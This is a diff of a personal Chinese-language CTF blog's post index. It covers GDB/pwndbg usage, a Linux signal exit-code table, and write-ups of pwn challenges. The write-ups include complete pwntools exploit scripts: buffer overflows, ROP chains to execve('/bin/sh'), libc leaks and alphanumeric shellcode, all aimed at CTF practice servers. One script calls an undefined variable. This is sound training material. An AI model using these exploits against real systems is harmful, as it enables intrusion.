+以Intel方式查看汇编代码（似乎pwndbg默认Intel汇编代码格式）：
+(gdb)/(pwndbg) set disassembly-flavor intel
+
+上述的查看反汇编格式，可以通过修改.gdbinit来完成。
+vim ~/.gdbinit(vim) disassembly-flavor intel
+
+接下来 我们一点一点开始讲。
+程序执行与控制执行程序及设置管理断点当我们要执行一个程序的时候，我们需要输入run（简写r）或者start
+(gdb)/(pwndbg) run		#程序直接跑一边，如果有断点进入断点处(gdb)/(pwndbg) r			#同上(gdb)/(pwndbg) start	#从gdb认为的入口点开始步入运行
+
+在这之后，我们一般而言会设置断点（break，简写b）来方便调试程序：
+(gdb)/(pwndbg) b main(gdb)/(pwndbg) break main(gdb)/(pwndbg) b *0x000000FF	#这是一个地址
+
+b是用来断点的，或者说是标记断点且默认处于启动状态。我们也可以用disable或者dis、disa来禁用全部断点或者部分断点。启用断点则是enable或者en。而当某个断点不需要的时候，我们可以使用delete或者d来删除断点。其中每个断点都会有一个b_id号码。不过删除和禁用分别有两种语法需要注意：
+(gdb)/(pwndbg) d id			#删除某id的断点(gdb)/(pwndbg) d 1			#删除id为1的断点(gdb)/(pwndbg) dis b id	#禁用某id的断点(gdb)/(pwndbg) dis b 1	#禁用id为1的断点(gdb)/(pwndbg) en b id	#启用某id的断点(gdb)/(pwndbg) en b 1		#启用id为1的断点
+
+其实pwn方向一般不会设置太多断点啥的。不过逆向倒是要学这些。
+如果想是一些开有PIE的保护的话，我们则需要一个*$rebase(偏移量)函数了。例如：
+b *$rebase(0x0f0)
+
+步操作int sum(int a,int b)&#123;    int sumnum = a + b;    return sum_num;&#125;int main()&#123;    int a;    printf(&quot;1+2=&quot;);    a = sum(1,2);    printf(&quot;%d&quot;,a);    return 0;&#125;
+
+在上面这个代码里面，我们可以用GDB做一些基础的程序运行操作：
+步入（**step**** 简写为****s****）：**用于单步执行程序，当遇到函数调用时，会进入该函数内部，逐行执行函数的实现代码。当我运行到第 6 行的 printf 的时候，步入会进入 printf 函数中，一步步走过 printf 函数的实现代码。
+步过（**next**** 简写为****n****）：**同样是单步执行，但遇到函数调用时，不会进入函数内部，而是直接执行完该函数后，进入下一行代码等待执行。当我运行到第 7 行的 printf 的时候，步过会不管 printf 函数里面如何如何，直接运行完 printf 函数进入到第 8 行 sum 函数待执行。
+s和n都可以在后面加一个&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;instruction&lt;/font&gt;参数，大概使用方法就是&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;si&lt;/font&gt;和&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;ni&lt;/font&gt;：
+&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;si&lt;/font&gt;（step instruction）：执行下一步汇编指令，会进入汇编或 C 函数内部，无论函数是否有调试信息。
+&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;ni&lt;/font&gt;（next instruction）：执行下一步汇编指令，不会进入任何函数内部，直接执行完当前汇编指令并停在下一条。
+简单来说，&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;s/n&lt;/font&gt;适用于 C 代码层面的调试，&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;si/ni&lt;/font&gt;适用于更底层的汇编层面调试，核心区别在于是否进入函数、以及进入后的定位级别（C 级 vs 汇编级）。上面两个指令，一般情况下都会用n和ni。
+步出（**finish**** 简写为****fin****）：**适用于已进入某个函数内部，希望快速结束该函数的执行，直接返回到调用该函数的下一行代码。当我从第八行步入到 sum 函数之后，我感觉 sum 函数不需要看，想要直接从 sum 函数回到 main 函数的时候，步出可以快速运行完 sum 函数回到 main 函数的第九行待执行。
+步止（**continue**&#x2F;**until**** 简写为****c**&#x2F;**u 行号****）：**用于让程序持续运行，执行到断点停止。如果我想运行到第 10 行等待，那么我可以设置一个断点在第十行，这样执行步止操作的时候我就可以直接运行到第十行。
+数据查看与修改寄存器数据与汇编代码查看在指令里面，分为_操作符号_和_被操作的对象_。例如下面的：
+查看（info 简写为i）：用于查看对象的值。例如查看断点则是i b
+寄存器（registers 简写为r）：一种被查看的对象。例如查看寄存器的值可以是i r
+例如查看寄存器的值可以写成(gdb)(pwndbg) i r
+反汇编（disassemble 函数名/$寄存器名(eip/rip)）：将某一段函数或者rip&#x2F;eip指针附近的机器码反编译为汇编。也是一种操作。
+(gdb)/(pwndbg) disassemble main(gdb)/(pwndbg) disassemble $rip
+
+内存数据查看除了上面的i r，我还可以通过print（缩写为p）来查看寄存器的位置（也就是此寄存器的地址），例如p eax
+如果我要看地址的话，就要用x指令来查询。
+例如有一个movzx eax,BYTE PTR[rbp-0x20]的操作，我现在想要查询rbp-0x20这个地址里面的值，就可以用：x/20b $rbp-0x20的方式。这样就是一个byte一个byte的查询20个byte。其中语法是这样的：
+x/[查询行数][以多少位输出][显示格式] [查询的地址]
+
+如此这般的有：
+x/20gx（64 位十六进制，显示 20 项）x/20wx（32 位）x/20bx（8 位）x/20bx（字符串显示）x/20ix（反汇编指令显示）
+内存数据修改如果我要修改这里的值，那么就用set指令，其中语法为：
+set ([地址值])=[修改值]	#这个地址值外面的的括号必须有
+
+例如set (rbp - 0x10) = 41
+如此这般的有：
+set *0x7ffffffe050=19（改写内存值）set $rax=19（改写寄存器值）set(char [4])0x80477a4 = &quot;Ace&quot;（改写内存字符串）
+远程调试]]></content>
+      <categories>
+        <category>PWN不出来</category>
+      </categories>
+      <tags>
+        <tag>PWN的工具笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux退出状态码</title>
+    <url>//docx/Linux%E9%80%80%E5%87%BA%E7%8A%B6%E6%80%81%E7%A0%81/</url>
+    <content><![CDATA[
+
+
+信号编号
+信号名称
+信号描述
+默认处理方式
+Exit code
+
+
+
+1.
+SIGHUP
+挂起
+终止
+1.
+
+
+2.
+SIGINT
+终端中断
+终止
+2.
+
+
+3.
+SIGQUIT
+终端退出
+终止、core dump
+131.
+
+
+4.
+SIGILL
+非法指令
+终止、core dump
+132.
+
+
+5.
+SIGTRAP
+跟踪 &#x2F; 断点陷阱
+终止、core dump
+133.
+
+
+6.
+SIGABRT
+终止进程
+终止、core dump
+134.
+
+
+7.
+SIGBUS
+Bus error
+终止、core dump
+135.
+
+
+8.
+SIGFPE
+算术异常
+终止、core dump
+136.
+
+
+9.
+SIGKILL
+杀死进程（必杀）
+终止
+9.
+
+
+10.
+SIGUSR1
+用户自定义信号 1
+终止
+10.
+
+
+11.
+SIGSEGV
+段错误
+终止、core dump
+139.
+
+
+12.
+SIGUSR2
+用户自定义信号 2
+终止
+12.
+
+
+13.
+SIGPIPE
+管道断开
+终止
+13.
+
+
+14.
+SIGALRM
+定时器信号
+终止
+14.
+
+
+15.
+SIGTERM
+终止进程
+终止
+15.
+
+
+16.
+SIGSTKFLT
+栈错误
+终止
+16.
+
+
+17.
+SIGCHLD
+子进程退出
+忽略
+无
+
+
+18.
+SIGCONT
+继续执行
+若停止则继续执行
+无
+
+
+19.
+SIGSTOP
+停止执行（必停）
+暂停执行
+无
+
+
+20.
+SIGTSTP
+停止
+暂停执行
+无
+
+
+21.
+SIGTTIN
+Stopped (tty input)
+暂停执行
+无
+
+
+22.
+SIGTTOU
+Stopped (tty output)
+暂停执行
+无
+
+
+23.
+SIGURG
+IO 紧急数据
+忽略
+无
+
+
+24.
+SIGXCPU
+突破对 cpu 时间的限制
+终止、core dump
+152.
+
+
+25.
+SIGXFSZ
+突破对文件大小的限制
+终止、core dump
+153.
+
+
+26.
+SIGVTALRM
+虚拟定时器超时
+终止
+26.
+
+
+27.
+SIGPROF
+性能分析定时器超时
+终止
+27.
+
+
+28.
+SIGWINCH
+终端窗口尺寸发生变化
+忽略
+无
+
+
+29.
+SIGIO
+IO 时可能产生
+终止
+29.
+
+
+30.
+SIGPWR
+电量行将耗尽
+终止
+30.
+
+
+31.
+SIGSYS
+错误的系统调用
+终止、core dump
+159.
+
+
+34~64
+SIGRTMIN~SIGRTMAX
+实时信号
+
+
+
+
+]]></content>
+      <categories>
+        <category>PWN不出来</category>
+      </categories>
+      <tags>
+        <tag>PWN攻略-所需表格</tag>
+        <tag>计算机原理相关表格</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>[NewStarCTF 2023 公开赛道]shell code revenge</title>
     <url>//docx/%5BNewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%5Dshell%20code%20revenge/</url>
     <content><![CDATA[
@@ -2063,32 +2063,6 @@ from pwn import *from ctypes import *from LibcSearcher import *context(log_level
       </tags>
   </entry>
   <entry>
-    <title>easy-shellcode</title>
-    <url>//docx/easy-shellcode/</url>
-    <content><![CDATA[
-类型：shellcode、栈溢出
-https://www.qsnctf.com/  题目叫做：Easy_Shellcode
-
-
-
-输入然后栈中执行，一开始的时候会输出v4的地址。
-
-PIE每次会随机地址，但是按照人类逻辑的最前面三位不动。通过0x7ff将后面的值全部获取。再return到这里执行shellcode即可。
-exp:
-from pwn import *context(log_level = &#x27;debug&#x27;, arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)ip=&#x27;challenge.qsnctf.com&#x27;port=34976file_addr = &#x27;./easy-shellcode&#x27;p = remote(ip,port)# p = process(file_addr)elf = ELF(file_addr)v4_addr=int(p.recvline()[2:],16)print(v4_addr)shellcode = asm(shellcraft.sh())payload = shellcodepayload += b&#x27;\x90&#x27;*(0x100-len(shellcode)+8)+p64(v4_addr)# print(payload)p.send(payload)p.interactive()
-
-]]></content>
-      <categories>
-        <category>PWN不出来</category>
-      </categories>
-      <tags>
-        <tag>shellcode</tag>
-        <tag>PWN的writeup</tag>
-        <tag>栈溢出</tag>
-        <tag>qxnctf</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>inndy_rop</title>
     <url>//docx/inndy_rop/</url>
     <content><![CDATA[
@@ -2117,6 +2091,70 @@ popedx_addr = 0x0806ecda
 逻辑是：我需要构造一个read(0,bss地址,8)的读取，这段代码的意思是从标准读取（第一参数&#x3D;0）中读取内容，取8（第三参数&#x3D;8）个字节，存放到bss地址（第二参数）中。随后再构造一个execv(“&#x2F;bin&#x2F;sh”,0,0)函数，类似于system（“&#x2F;bin&#x2F;sh”）。具体如exp：
 exp：
 from pwn import *context(log_level = &#x27;debug&#x27;, arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;)ip=&#x27;node5.buuoj.cn&#x27;port=26102file_addr = &#x27;./rop&#x27;p = remote(ip,port)# p = process(file_addr)elf = ELF(file_addr)#强迫症这一块bss_____addr = 0x080e9000+0x100int0x80_addr = 0x0806f430popeax__addr = 0x080b8016popebx__addr = 0x080481c9popecx__addr = 0x080de769popedx__addr = 0x0806ecda#read(0,.bss,8), READ_FUNCTION = 3payload = b&#x27;a&#x27;*(12+4)payload += p32(popeax__addr) + p32(0x03)payload += p32(popebx__addr) + p32(0x00)payload += p32(popecx__addr) + p32(bss_____addr)payload += p32(popedx__addr) + p32(0x08)payload += p32(int0x80_addr)#execv(.bss,0,0), EXECV_FUNCTION = 0x0bpayload += p32(popeax__addr) + p32(0x0b)payload += p32(popebx__addr) + p32(bss_____addr)payload += p32(popecx__addr) + p32(0)payload += p32(popedx__addr) + p32(0)payload += p32(int0x80_addr)p.sendline(payload)p.sendline(b&quot;/bin/sh\x00&quot;)p.interactive()
+
+]]></content>
+      <categories>
+        <category>PWN不出来</category>
+      </categories>
+      <tags>
+        <tag>PWN的writeup</tag>
+        <tag>buuctf</tag>
+        <tag>ret2系列</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>easy-shellcode</title>
+    <url>//docx/easy-shellcode/</url>
+    <content><![CDATA[
+类型：shellcode、栈溢出
+https://www.qsnctf.com/  题目叫做：Easy_Shellcode
+
+
+
+输入然后栈中执行，一开始的时候会输出v4的地址。
+
+PIE每次会随机地址，但是按照人类逻辑的最前面三位不动。通过0x7ff将后面的值全部获取。再return到这里执行shellcode即可。
+exp:
+from pwn import *context(log_level = &#x27;debug&#x27;, arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)ip=&#x27;challenge.qsnctf.com&#x27;port=34976file_addr = &#x27;./easy-shellcode&#x27;p = remote(ip,port)# p = process(file_addr)elf = ELF(file_addr)v4_addr=int(p.recvline()[2:],16)print(v4_addr)shellcode = asm(shellcraft.sh())payload = shellcodepayload += b&#x27;\x90&#x27;*(0x100-len(shellcode)+8)+p64(v4_addr)# print(payload)p.send(payload)p.interactive()
+
+]]></content>
+      <categories>
+        <category>PWN不出来</category>
+      </categories>
+      <tags>
+        <tag>shellcode</tag>
+        <tag>PWN的writeup</tag>
+        <tag>栈溢出</tag>
+        <tag>qxnctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>jarvisoj_level1</title>
+    <url>//docx/jarvisoj_level1/</url>
+    <content><![CDATA[
+ROP-ret2syscall，栈溢出
+https://buuoj.cn/challenges#jarvisoj_level2_x64
+
+checksec
+
+
+
+保护全关，32位系统。其中一开始会输出buf的地址
+这个逻辑很简单，我先输入shellcode，然后栈溢出，返回到栈上的buf地址运行即可。
+exp：
+from pwn import *context(log_level = &#x27;debug&#x27;, arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;)ip=&#x27;ip_addr&#x27;port=1111file_addr = &#x27;./jarvisoj_level1&#x27;# p = remote(ip,port)p = process(file_addr)elf = ELF(file_addr)buf_addr = int(p.recvline()[len(&quot;What&#x27;s this:&quot;)+2:-2],16)print(buf_addr)payload = asm(shellcraft.sh())payload += b&#x27;a&#x27;*(136-len(payload)+4)payload += p32(buf_addr)p.send(payload)p.interactive()
+
+这个线上似乎没有setbuf，所以输入和输出有点小问题。
+
+似乎需要我先输入什么才会有反应…
+妈的，虽然是题目的bug，但是也不是没有解决方案。我么构造这么一个payload流程：
+
+他似乎收到回车才会输出地址，那么我就先输入一堆东西然后回车，这样他就会输出地址，又会再次返回到vulnerable函数中再输出一次地址，这个时候我再输入shellcode+返回地址为buf。他就可以去buf执行了。
+似乎还是不行…
+还有一个libc的办法来做，思路是这样的：
+构造rop调用write函数来泄露libc的基地址，并且再次调用main函数，根据libc的基址得到system和&#x2F;bin&#x2F;sh字符串地址，然后再次利用漏洞构造rop调用system(‘\bin\sh’)即可。
+
+from pwn import *from LibcSearcher import *context(log_level = &#x27;debug&#x27;, arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;)ip=&#x27;node5.buuoj.cn&#x27;port=28043file_addr = &#x27;./jarvisoj_level1&#x27;p = remote(ip,port)# p = process(file_addr)elf = ELF(file_addr)main_addr=0x80484b7write_plt=elf.plt[&#x27;write&#x27;]write_got=elf.got[&#x27;write&#x27;]payload =b&#x27;a&#x27; * (0x88 + 0x4 ) + p32(write_plt) + p32(main_addr) +p32(0x1)+p32(write_got)+p32(0x4) p.send(payload)write_addr = u32(io.recv(4))libc=LibcSearcher(&#x27;write&#x27;,write_addr)	libc_base=write_addr-libc.dump(&#x27;write&#x27;)system_addr=libc_base+libc.dump(&#x27;system&#x27;)bin_sh=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)payload =b&#x27;a&#x27; * (0x88 + 0x4) + p32(system_addr) + p32(main_addr)+ p32(bin_sh)p.send(payload)p.interactive()
 
 ]]></content>
       <categories>
@@ -2158,6 +2196,43 @@ from pwn import *context(log_level = &#x27;debug&#x27;, arch = &#x27;i386&#x27;,
 
 
 
+]]></content>
+      <categories>
+        <category>PWN不出来</category>
+      </categories>
+      <tags>
+        <tag>PWN的writeup</tag>
+        <tag>buuctf</tag>
+        <tag>ret2系列</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>jarvisoj_level2_64</title>
+    <url>//docx/jarvisoj_level2_64/</url>
+    <content><![CDATA[
+ROP-ret2text，栈溢出
+https://buuoj.cn/challenges#jarvisoj_level2_x64
+
+是jarvisoj_level2的64版本。
+按照32位的思路，我们找一下system函数和“&#x2F;bin&#x2F;sh”即可。
+
+
+system_addr = 0x00000000004004C0
+binsh_str_addr = 0x0000000000600A90
+
+这边的buf栈帧变为128了，需要改一下。其他32位中所有的占4字节的都变成8字节例如saved registers。
+然后，在64位里面，所谓的“形式参数”不再是存储在栈中而是存储在了rdi里面。如图中鼠标指出的所示（因为byd每次截图都截不到只能用手机拍了）
+
+所以我们要把0x0000000000600A90传递给rdi才行。
+
+通过ropper很轻松就能找到这行数据。并且后面还有一个ret我们刚好可以用到。
+其payload构造思路也变成了：
+
+整个流程就是：先调用pop rdi，在rdi里面塞入&#x2F;bin&#x2F;sh的值，随后需要一个ret地址，塞入system地址之后ret指令跳转到system地址。而system会直接调用rdi里面的值，rdi已经变成&#x2F;bin&#x2F;sh了。
+exp:
+from pwn import *file_path = &#x27;./jarvisoj_level2_x64&#x27;context(log_level = &#x27;debug&#x27;, binary=file_path, os = &#x27;linux&#x27;)ip=&#x27;nnode5.buuoj.cn&#x27;port=27500# p = remote(ip,port)p = process(file_path)elf = ELF(file_path)system_addr=0x00000000004004C0system_plt = elf.plt[&#x27;system&#x27;]print(system_plt)binsh_str_addr=0x600A90pop_rdi_ret_addr=0x4006b3payload = b&#x27;a&#x27;*(0x88)+p64(pop_rdi_ret_addr)+p64(binsh_str_addr)+p64(system_plt)print(payload)p.sendafter(&#x27;Input:&#x27;,payload)p.interactive()
+
+后记：我的ubuntu似乎是有点太新了。本地打不通但是远程可以。
 ]]></content>
       <categories>
         <category>PWN不出来</category>
@@ -2230,78 +2305,34 @@ from pwn import*context(log_level = &#x27;debug&#x27;, arch = &#x27;amd64&#x27;,
       </tags>
   </entry>
   <entry>
-    <title>jarvisoj_level1</title>
-    <url>//docx/jarvisoj_level1/</url>
+    <title>mrctf2020_shellcode_revenge</title>
+    <url>//docx/mrctf2020_shellcode_revenge/</url>
     <content><![CDATA[
-ROP-ret2syscall，栈溢出
-https://buuoj.cn/challenges#jarvisoj_level2_x64
+类型：shellcode 字符审查
+https://buuoj.cn/challenges#mrctf2020_shellcode
 
-checksec
+一如既往的checksec
 
+打开ida之后我们发现图形化反汇编mian函数里面有很多的跳转。我们直接F5，会报错，说call rax这一行有问题。我们直接右键未定义即可。
 
+看起来是一堆if字符检测，我们拿出离散数学的知识和ASCII码表对照一看就会快速发现这是一个把所有的非字母、非数字常规文本字符给去掉了。只有“qwertyuiopasdfghjklzxcvbnm QWERTYUIOPASDFGHJKLZXCV BNM 1234567890”这些字符。
+然后原理和mrctf2020_shellcode一样，读入什么执行什么。
+我们可以用alpha3工具来帮我们生成这个shellcode：alpha3.py
+ok了，然后我们就得到64位的shellcode字符串化的串为：
+Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2O2u2E0Z7m0n7m0R0b2x2o0Y102x0B7O2A1P2J0n102j0V0l2A0T170Z2j0Y7N0O1O137M0I1P132v0H0V10142v060H0f11000J0q11180I1711160J0Z110h0k060V0y0g2E0m0K170u0n110m2H11120n2n0U1N0f7N0m0H192m0n2n0U10112t0H12131k2k0h0l02102w0m0I112m2w0C01
 
-保护全关，32位系统。其中一开始会输出buf的地址
-这个逻辑很简单，我先输入shellcode，然后栈溢出，返回到栈上的buf地址运行即可。
-exp：
-from pwn import *context(log_level = &#x27;debug&#x27;, arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;)ip=&#x27;ip_addr&#x27;port=1111file_addr = &#x27;./jarvisoj_level1&#x27;# p = remote(ip,port)p = process(file_addr)elf = ELF(file_addr)buf_addr = int(p.recvline()[len(&quot;What&#x27;s this:&quot;)+2:-2],16)print(buf_addr)payload = asm(shellcraft.sh())payload += b&#x27;a&#x27;*(136-len(payload)+4)payload += p32(buf_addr)p.send(payload)p.interactive()
-
-这个线上似乎没有setbuf，所以输入和输出有点小问题。
-
-似乎需要我先输入什么才会有反应…
-妈的，虽然是题目的bug，但是也不是没有解决方案。我么构造这么一个payload流程：
-
-他似乎收到回车才会输出地址，那么我就先输入一堆东西然后回车，这样他就会输出地址，又会再次返回到vulnerable函数中再输出一次地址，这个时候我再输入shellcode+返回地址为buf。他就可以去buf执行了。
-似乎还是不行…
-还有一个libc的办法来做，思路是这样的：
-构造rop调用write函数来泄露libc的基地址，并且再次调用main函数，根据libc的基址得到system和&#x2F;bin&#x2F;sh字符串地址，然后再次利用漏洞构造rop调用system(‘\bin\sh’)即可。
-
-from pwn import *from LibcSearcher import *context(log_level = &#x27;debug&#x27;, arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;)ip=&#x27;node5.buuoj.cn&#x27;port=28043file_addr = &#x27;./jarvisoj_level1&#x27;p = remote(ip,port)# p = process(file_addr)elf = ELF(file_addr)main_addr=0x80484b7write_plt=elf.plt[&#x27;write&#x27;]write_got=elf.got[&#x27;write&#x27;]payload =b&#x27;a&#x27; * (0x88 + 0x4 ) + p32(write_plt) + p32(main_addr) +p32(0x1)+p32(write_got)+p32(0x4) p.send(payload)write_addr = u32(io.recv(4))libc=LibcSearcher(&#x27;write&#x27;,write_addr)	libc_base=write_addr-libc.dump(&#x27;write&#x27;)system_addr=libc_base+libc.dump(&#x27;system&#x27;)bin_sh=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)payload =b&#x27;a&#x27; * (0x88 + 0x4) + p32(system_addr) + p32(main_addr)+ p32(bin_sh)p.send(payload)p.interactive()
+操，太长了。然后我发现用python2的方法生成的可以打通
+exp如下：
+from pwn import*context(log_level = &#x27;debug&#x27;, arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;)ip=&#x27;node5.buuoj.cn&#x27;port=26117file_addr = &#x27;./mrctf2020_shellcode_revenge&#x27;p = remote(ip,port)#p = process(file_addr)elf = ELF(file_addr)shellcode = b&#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00&#x27;payload = shellcodeprint(payload)p.sendafter(b&#x27;magic&#x27;,payload)p.interactive()
 
 ]]></content>
       <categories>
         <category>PWN不出来</category>
       </categories>
       <tags>
+        <tag>shellcode</tag>
         <tag>PWN的writeup</tag>
         <tag>buuctf</tag>
-        <tag>ret2系列</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>jarvisoj_level2_64</title>
-    <url>//docx/jarvisoj_level2_64/</url>
-    <content><![CDATA[
-ROP-ret2text，栈溢出
-https://buuoj.cn/challenges#jarvisoj_level2_x64
-
-是jarvisoj_level2的64版本。
-按照32位的思路，我们找一下system函数和“&#x2F;bin&#x2F;sh”即可。
-
-
-system_addr = 0x00000000004004C0
-binsh_str_addr = 0x0000000000600A90
-
-这边的buf栈帧变为128了，需要改一下。其他32位中所有的占4字节的都变成8字节例如saved registers。
-然后，在64位里面，所谓的“形式参数”不再是存储在栈中而是存储在了rdi里面。如图中鼠标指出的所示（因为byd每次截图都截不到只能用手机拍了）
-
-所以我们要把0x0000000000600A90传递给rdi才行。
-
-通过ropper很轻松就能找到这行数据。并且后面还有一个ret我们刚好可以用到。
-其payload构造思路也变成了：
-
-整个流程就是：先调用pop rdi，在rdi里面塞入&#x2F;bin&#x2F;sh的值，随后需要一个ret地址，塞入system地址之后ret指令跳转到system地址。而system会直接调用rdi里面的值，rdi已经变成&#x2F;bin&#x2F;sh了。
-exp:
-from pwn import *file_path = &#x27;./jarvisoj_level2_x64&#x27;context(log_level = &#x27;debug&#x27;, binary=file_path, os = &#x27;linux&#x27;)ip=&#x27;nnode5.buuoj.cn&#x27;port=27500# p = remote(ip,port)p = process(file_path)elf = ELF(file_path)system_addr=0x00000000004004C0system_plt = elf.plt[&#x27;system&#x27;]print(system_plt)binsh_str_addr=0x600A90pop_rdi_ret_addr=0x4006b3payload = b&#x27;a&#x27;*(0x88)+p64(pop_rdi_ret_addr)+p64(binsh_str_addr)+p64(system_plt)print(payload)p.sendafter(&#x27;Input:&#x27;,payload)p.interactive()
-
-后记：我的ubuntu似乎是有点太新了。本地打不通但是远程可以。
-]]></content>
-      <categories>
-        <category>PWN不出来</category>
-      </categories>
-      <tags>
-        <tag>PWN的writeup</tag>
-        <tag>buuctf</tag>
-        <tag>ret2系列</tag>
       </tags>
   </entry>
   <entry>
@@ -2362,69 +2393,6 @@ fd.、.buf.、.count分别对应edi，rsi和edx三个寄存器。那么ssize_t�
       </tags>
   </entry>
   <entry>
-    <title>mrctf2020_shellcode_revenge</title>
-    <url>//docx/mrctf2020_shellcode_revenge/</url>
-    <content><![CDATA[
-类型：shellcode 字符审查
-https://buuoj.cn/challenges#mrctf2020_shellcode
-
-一如既往的checksec
-
-打开ida之后我们发现图形化反汇编mian函数里面有很多的跳转。我们直接F5，会报错，说call rax这一行有问题。我们直接右键未定义即可。
-
-看起来是一堆if字符检测，我们拿出离散数学的知识和ASCII码表对照一看就会快速发现这是一个把所有的非字母、非数字常规文本字符给去掉了。只有“qwertyuiopasdfghjklzxcvbnm QWERTYUIOPASDFGHJKLZXCV BNM 1234567890”这些字符。
-然后原理和mrctf2020_shellcode一样，读入什么执行什么。
-我们可以用alpha3工具来帮我们生成这个shellcode：alpha3.py
-ok了，然后我们就得到64位的shellcode字符串化的串为：
-Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2O2u2E0Z7m0n7m0R0b2x2o0Y102x0B7O2A1P2J0n102j0V0l2A0T170Z2j0Y7N0O1O137M0I1P132v0H0V10142v060H0f11000J0q11180I1711160J0Z110h0k060V0y0g2E0m0K170u0n110m2H11120n2n0U1N0f7N0m0H192m0n2n0U10112t0H12131k2k0h0l02102w0m0I112m2w0C01
-
-操，太长了。然后我发现用python2的方法生成的可以打通
-exp如下：
-from pwn import*context(log_level = &#x27;debug&#x27;, arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;)ip=&#x27;node5.buuoj.cn&#x27;port=26117file_addr = &#x27;./mrctf2020_shellcode_revenge&#x27;p = remote(ip,port)#p = process(file_addr)elf = ELF(file_addr)shellcode = b&#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00&#x27;payload = shellcodeprint(payload)p.sendafter(b&#x27;magic&#x27;,payload)p.interactive()
-
-]]></content>
-      <categories>
-        <category>PWN不出来</category>
-      </categories>
-      <tags>
-        <tag>shellcode</tag>
-        <tag>PWN的writeup</tag>
-        <tag>buuctf</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>overflow_ez_32</title>
-    <url>//docx/overflow_ez_32/</url>
-    <content><![CDATA[首先checksec：
-
-保护全关，一般保护全关的题目要么特别简单要么特别难。很显然（因为这是我自己做的题），这个是前者。（当然不是所有带有ez的题目都很ez）（但是这个是真ez）
-直接拖到ida一探究竟。
-
-有一个main函数和一个back_door，还有一个overflow和init函数，backdoor里面是一个超级大后门：
-
-main函数里面是init和overflow，一个是初始化，还有一个是一个最简单的栈溢出：
-
-如图可见，这里有一个不安全的gets函数，然后有一个s变量。
-
-点进去之后我们就能发现，从-0x18到+0x04都是本栈帧的模样，然后要输入0x18个字节覆盖char字符串s和一个var_4，输入4个字节覆盖saved register，最后输入4字节的地址来覆盖return地址。
-所需要的地址就是我们的backdoor函数地址…
-
-backdoor的位置在0x080491F0这个位置上，当然我们也可以填入0x08049211这个地址，这样可以跳过上面那个puts函数的调用。不过这里没必要，我们就以backdoor的地址为需要进入的地址：
-exp：
-from pwn import *#32context(log_level = &#x27;debug&#x27;, arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;)file_addr = &#x27;./overflow_ez_32&#x27;p = process(file_addr)elf = ELF(file_addr)backdoor_addr = 0x080491F0payload = b&#x27;a&#x27;*0x18payload += b&#x27;a&#x27;*0x04payload += p32(backdoor_addr)print(payload)p.sendafter(b&#x27;door?\n&#x27;,payload)p.interactive()
-
-非常简单。
-]]></content>
-      <categories>
-        <category>PWN不出来</category>
-      </categories>
-      <tags>
-        <tag>PWN的writeup</tag>
-        <tag>栈溢出</tag>
-        <tag>nxctf</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>pwnable_orw【有问题】</title>
     <url>//docx/pwnable_orw%E3%80%90%E6%9C%89%E9%97%AE%E9%A2%98%E3%80%91/</url>
     <content><![CDATA[
@@ -2482,32 +2450,6 @@ umode_t mode
         <tag>shellcode</tag>
         <tag>PWN的writeup</tag>
         <tag>buuctf</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>pwntools</title>
-    <url>//docx/pwntools/</url>
-    <content><![CDATA[下载python3版本这个就去看我写的pwn基础配置吧，一般而言不做老题目的话python3适配的pwntools完全够用了。不过我为了测试和学习一些老东西留下的宝贵信息，还是会用到适配python2的pwntools的。
-pwn基础配置
-python2版本pwntools 从 4.0 版本开始完全移除了 Python 2 支持，依赖现代 Python 特性（如 asyncio）。
-现在想用pwntools的python2版本只能用pwntools 3.14.1
-检查python2和pip2python2 --version  # 应输出 Python 2.7.18pip2 --version     # 应输出 pip 20.3.4 或类似版本
-
-一般而言，可能没有python2.可以去看我写的另外一个工具笔记：
-python2环境
-如果上面ok了
-pip2 install --user pyelftools==0.27pip2 install --user --upgrade &#x27;pwntools&lt;3.15&#x27;
-
-使用pwntools的使用非常简单，记住一些简单的函数就可以用起来了：
-这边写一个简单的脚本，主要是看函数的：
